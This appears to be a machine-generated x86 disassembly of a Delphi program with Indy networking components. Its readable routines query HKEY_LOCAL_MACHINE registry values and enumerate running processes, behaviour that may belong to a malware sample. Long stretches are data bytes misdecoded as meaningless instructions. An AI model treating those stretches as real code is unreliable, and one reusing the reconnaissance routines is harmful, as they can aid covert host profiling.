call sub_45ec84
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_461538
push [ ebp - 0x34 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
lea edx [ ebp - 0x38 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x38 ]
lea eax [ ebp - 0x3c ]
call sub_4615a4
push [ ebp - 0x3c ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x5
call sub_4051e4
push [ ebx ]
push 0x0
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4051e4
push [ ebx ]
push ebp
lea eax [ ebp - 0x40 ]
call sub_460f1c
pop ecx
push [ ebp - 0x40 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x4
call sub_4051e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461816
lea eax [ ebp - 0x40 ]
mov edx 0xc
call sub_404e68
retn
sub_4618f4
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_461ac8
push [ fs : eax ]
mov [ fs : eax ] esp
push [ rw-data ]
push 0x0
push r-xdata
push r-xdata
mov eax rw-data
mov edx 0x4
call sub_4051e4
push [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
mov eax rw-data
mov edx 0x4
call sub_4051e4
xor eax eax
push ebp
push sub_461a9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d80
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
mov edx 0x80000002
mov eax ebx
call sub_420e5c
lea edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x14 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
cmp al 0x1
jne r-xdata
mov eax ebx
call sub_420e2c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4213a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461acf
lea eax [ ebp - 0x28 ]
mov edx 0x7
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax ebx
call sub_420e2c
inc [ ebp - 0xc ]
dec esi
jne r-xdata
push [ rw-data ]
lea edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x24 ]
mov eax ebx
call sub_421600
push [ ebp - 0x24 ]
push r-xdata
push r-xdata
mov eax rw-data
mov edx 0x4
call sub_4051e4
mov edx 0x80000002
mov eax ebx
call sub_420e5c
lea edx [ ebp - 0x18 ]
mov eax r-xdata
call sub_45ec84
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x1c ]
pop eax
call sub_40512c
mov edx [ ebp - 0x18 ]
xor ecx ecx
mov eax ebx
call sub_420ec4
lea edx [ ebp - 0x20 ]
mov eax r-xdata
call sub_45ec84
mov edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_421600
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_461c0c
push ebp
mov ebp esp
add esp 0xfffffecc
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x134 ] eax
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x12c ] eax
mov esi rw-data
xor eax eax
push ebp
push sub_461d7a
push [ fs : eax ]
mov [ fs : eax ] esp
push [ esi ]
push 0x0
push r-xdata
push r-xdata
mov eax esi
mov edx 0x4
call sub_4051e4
push [ esi ]
lea edx [ ebp - 0x12c ]
mov eax r-xdata
call sub_45ec84
push [ ebp - 0x12c ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x4
call sub_4051e4
xor eax eax
push ebp
push sub_461d52
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax 0x2
call sub_45dd54
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x128 ] 0x128
lea edx [ ebp - 0x128 ]
mov eax ebx
call sub_45dd74
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d81
lea eax [ ebp - 0x134 ]
mov edx 0x3
call sub_404e68
retn
push ebx
call CloseHandle
push [ esi ]
lea eax [ ebp - 0x130 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x104
call sub_4050b4
push [ ebp - 0x130 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x4
call sub_4051e4
jmp r-xdata
lea edx [ ebp - 0x128 ]
mov eax ebx
call sub_45dd94
test eax eax
jne r-xdata
push [ esi ]
lea eax [ ebp - 0x134 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x104
call sub_4050b4
push [ ebp - 0x134 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x4
call sub_4051e4
sub_461dc8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_461e7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax rw-data
call sub_404e44
xor eax eax
push ebp
push sub_461e30
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_460778
call sub_460b40
call sub_46161c
call sub_4618f4
call sub_461c0c
lea eax [ ebp - 0x4 ]
call sub_45fd0c
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_40512c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_45dfa8
mov edx [ ebp - 0x8 ]
mov eax rw-data
call sub_404e98
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45e5e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461e86
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
sub_461ead
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_461eeb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ef2
retn
mov eax rw-data
call sub_404e44
mov eax rw-data
call sub_404e44
sub_461fa4
push ebx
mov ebx eax
mov [ ebx ] 0x0
mov [ ebx + 0x1 ] 0x0
lea eax [ ebx + 0x8 ]
mov edx r-xdata
call sub_404e98
mov [ ebx + 0x4 ] 0x2
mov [ ebx + 0x2 ] 0x2c
mov [ ebx + 0x3 ] 0x2e
mov [ ebx + 0x5 ] 0x2f
lea eax [ ebx + 0xc ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x10 ]
mov edx r-xdata
call sub_404e98
mov [ ebx + 0x6 ] 0x3a
lea eax [ ebx + 0x14 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x18 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x20 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x1c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x24 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x28 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x2c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x34 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x38 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x3c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x40 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x44 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x48 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x4c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x50 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x54 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x58 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x5c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x60 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x64 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x68 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x70 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x74 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x78 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x7c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x80 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x84 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x88 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x8c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x90 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x94 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x98 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0x9c ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0xa0 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0xa4 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0xa8 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0xac ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0xb0 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0xb4 ]
mov edx r-xdata
call sub_404e98
lea eax [ ebx + 0xb8 ]
mov edx r-xdata
call sub_404e98
mov [ ebx + 0x7 ] 0x2c
pop ebx
retn
sub_4624e8
push ebp
mov ebp esp
push ecx
mov ecx 0x17
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_462551
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc0 ]
call sub_461fa4
lea eax [ ebp - 0xc0 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx esi
mov ecx [ ebp + 0xc ]
mov eax ebx
call sub_40adbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462558
lea eax [ ebp - 0xc0 ]
mov edx [ r-xdata ]
call sub_405aa4
retn
sub_46257c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_409990
pop esi
pop ebx
pop ebp
retn 0x4
sub_4625e8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
movzx eax [ r-xdata ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0xc ]
mov edx esi
mov eax ebx
call sub_40ef9c
pop esi
pop ebx
pop ebp
retn 0x8
sub_462614
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462659
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4626c4
mov eax [ ebp - 0x4 ]
call sub_4099e8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462660
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_462668
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4626b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4626c4
mov eax [ ebp - 0x4 ]
mov edx edi
call sub_409a24
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4626b9
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_462700
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_40ca64
pop esi
pop ebx
pop ebp
retn 0x8
sub_462750
push ebp
mov ebp esp
add esp 0xfffffff8
movzx eax [ ebp + 0x8 ]
push eax
mov eax edx
mov edx ecx
movzx ecx [ ebp + 0xc ]
call sub_40baa0
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_462778
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax edx
mov edx ecx
movzx ecx [ ebp + 0x8 ]
call sub_40bc44
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4627e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46283d
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_4626c4
mov eax [ ebp - 0xc ]
call sub_409a5c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462844
lea eax [ ebp - 0xc ]
call sub_404e44
retn
sub_462944
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462a2b
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
lea ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x6 ]
mov eax ebx
call sub_462734
push 0x5
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_462720
movzx eax ax
dec eax
cmp eax 0x6
jbe r-xdata
inc eax
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
movzx eax [ ebp - 0x2 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0x0
movzx eax [ ebp - 0x4 ]
dec eax
cmp eax 0xb
jbe r-xdata
call sub_403e2c
inc eax
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
movzx eax [ ebp - 0x6 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x3c ]
mov edx r-xdata
mov eax ebx
call sub_462700
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
mov eax r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea ecx [ ebp - 0x38 ]
mov edx r-xdata
mov eax ebx
call sub_4624e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462a32
lea eax [ ebp - 0x3c ]
call sub_404e44
retn
call sub_403e2c
sub_462a7f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_462ad1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ad8
retn
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_405af0
sub_462adc
sub [ ebx ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
sub eax [ esi ]
add al 0x0
add [ eax ] al
dec esp
pop ds
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] cl
push esp
dec ecx
push ebx
jns r-xdata
add [ eax ] al
hlt
dec esi
popad
je r-xdata
hlt
jbe r-xdata
add [ eax ] al
push esi
inc ebx
dec esp
sub_462d70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc00462d
add [ eax ] al
add ah al
add [ eax ] 0xac
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
or al 0x45
dec ecx
inc ebp
js r-xdata
inc ebp
js r-xdata
jo r-xdata
inc edi
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ esi ] 0x46
add [ eax + eax ] cl
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] 0x1800408d
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp ] bl
inc esi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc al [ ebp + 0x49 ]
push ebx
imul ebp [ ebp + 0x6e ] 0x63784574
js r-xdata
arpl [ ebp + 0x66 ] sp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0xc4674eb
add [ eax ] al
add [ ebp + ebp + 0x46 ] ch
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
imul ebp [ edi + 0x6e ] 0x462e7c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00462e ] al
add [ eax ] al
add ah cl
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
popad
outsb
insb
inc ebp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
das
inc esi
insb
jns r-xdata
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi ] bl
inc esi
add [ eax + eax ] cl
add [ eax ] al
cld
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc al [ ebp + 0x49 ]
dec esi
outsd
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0xc0046 ] dh
add [ eax ] al
cld
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc al 0x45
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
imul ebp [ edi + 0x6e ] 0x2f48c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x46 ] cl
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc al 0x45
dec ecx
push eax
popad
arpl [ ebx + 0x61 ] bp
push ebx
xor [ esi ] eax
pop ss
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
inc ebx
insb
outsd
jae r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc [ ebp + 0x49 ] eax
push edx
popad
outsb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc esi
add [ eax + eax ] cl
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc ecx
inc eax
add al al
inc ecx
insb
insb
inc edx
jns r-xdata
inc ebp
inc eax
add [ eax + 0x462f ] dh
add [ eax ] al
outsb
push eax
outsd
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
xor [ esi ] al
or al 0x0
add [ eax ] al
cld
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc004631
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
push eax
xor [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
xor [ esi ] eax
or al 0x0
add [ eax ] al
cld
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb [ ebp + 0x49 ] al
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
add al al
inc ecx
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc eax [ ebp + 0x49 ]
dec ecx
outsb
jbe r-xdata
inc ecx
imul ebp [ esi + 0x64 ] 0x74726f50
outsd
jne r-xdata
add [ 0x43644945 ] dl
outsb
je r-xdata
push [ ebx ]
rcr [ edx + 0x59 ] 0x59
mov [ fs : eax ] edx
push sub_463234
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
je r-xdata
popad
outsb
outsb
outsd
je r-xdata
add [ eax ] al
add ah bh
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
and al [ ebp + 0x49 ]
inc ebx
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
mov ah 0x31
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004631 ] bh
je r-xdata
shl ah 0x30
inc esi
add [ eax ] al
imul edi [ edx + 0x65 ] 0x426f6f54
imul esp [ edi - 0x73 ] 0x30180040
inc esi
add [ eax ] al
jl r-xdata
ror [ ebx - 0x5662173a ] cl
cli
push eax
push esi
jb r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc eax 0x43644945
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004630 ] al
add [ eax ] al
add ah bh
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
jmp [ edi + ecx * 4 + 0x5 ]
imul ebp [ edi + 0x6e ] 0x6e656857
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
nop
sub_4631dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_46322d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_40dbb4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463234
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
add esp 0xfffffff0
call sub_404288
sub_4632b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
xor al [ esi ]
add al 0x0
add [ eax ] al
fsubr [ edx ]
inc esi
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ ebx ] cl
push esp
dec ecx
push ebx
jns r-xdata
outsw
push edi
imul ebp [ esi + 0x33 ] 0x46335432
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] bl
inc esi
add [ eax + eax ] cl
add [ eax ] al
insb
